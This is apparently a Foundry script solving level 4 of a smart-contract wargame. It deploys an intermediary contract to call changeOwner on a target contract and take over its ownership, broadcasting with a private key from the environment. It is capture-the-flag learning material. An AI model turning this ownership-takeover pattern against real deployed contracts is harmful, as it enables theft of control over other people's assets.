// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/MiddleContract.sol";

contract Lv4Solution is Script {

    function run(address targetAddress, address desiredOwner) public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        MiddleContract mc = new MiddleContract(targetAddress);
        address newOwner = mc.callChangeOwner(desiredOwner);
        
        vm.stopBroadcast();

        console.log("New owner: ", newOwner);
    }
}